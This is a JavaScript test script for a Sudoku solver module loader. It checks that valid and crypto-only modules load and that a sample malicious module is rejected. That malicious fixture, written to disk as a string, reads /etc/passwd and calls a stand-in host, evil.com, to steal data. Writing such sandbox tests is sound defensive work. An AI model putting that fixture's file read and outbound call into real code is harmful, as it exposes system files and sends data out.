const { SudokuModuleLoader } = require('../module-loader');
const fs = require('fs');

console.log('🧪 Testing Sudoku Module Loading...\n');

async function testModuleLoading() {
  const loader = new SudokuModuleLoader();

  console.log('1. Testing valid sudoku solver module...');
  try {
    const module = loader.loadModule('./sudoku-solver.js');
    console.log('✅ Module loaded successfully');
    console.log(`📋 Metadata:`, module.metadata);
  } catch (error) {
    console.error('❌ Failed to load valid module:', error.message);
  }

  console.log('\n2. Testing malicious module rejection...');

  // Create a malicious module for testing
  const maliciousModule = `
const fs = require('fs');
const http = require('http');

function solveSudoku(puzzle) {
  // This module tries to access the file system and make network requests
  fs.readFileSync('/etc/passwd');
  http.get('http://evil.com/steal-data');
  return puzzle;
}

module.exports = { solveSudoku };
`;

  fs.writeFileSync('./test/malicious-module.js', maliciousModule);

  try {
    const module = loader.loadModule('./test/malicious-module.js');
    console.log('❌ Malicious module was incorrectly allowed!');
  } catch (error) {
    console.log('✅ Malicious module correctly rejected:', error.message.split('\n')[0]);
  } finally {
    // Cleanup
    if (fs.existsSync('./test/malicious-module.js')) {
      fs.unlinkSync('./test/malicious-module.js');
    }
  }

  console.log('\n3. Testing crypto-only module...');

  const cryptoOnlyModule = `
const crypto = require('crypto');

function solveSudoku(puzzle) {
  const hash = crypto.createHash('sha256').update(JSON.stringify(puzzle)).digest('hex');
  console.log('Puzzle hash:', hash);
  return puzzle; // Simple passthrough for testing
}

module.exports = {
  solveSudoku,
  metadata: {
    name: 'crypto-test',
    cryptoUsage: 'builtin-only'
  }
};
`;

  fs.writeFileSync('./test/crypto-module.js', cryptoOnlyModule);

  try {
    const module = loader.loadModule('./test/crypto-module.js');
    console.log('✅ Crypto-only module loaded successfully');
  } catch (error) {
    console.error('❌ Crypto-only module rejected:', error.message);
  } finally {
    // Cleanup
    if (fs.existsSync('./test/crypto-module.js')) {
      fs.unlinkSync('./test/crypto-module.js');
    }
  }
}

testModuleLoading().catch(console.error);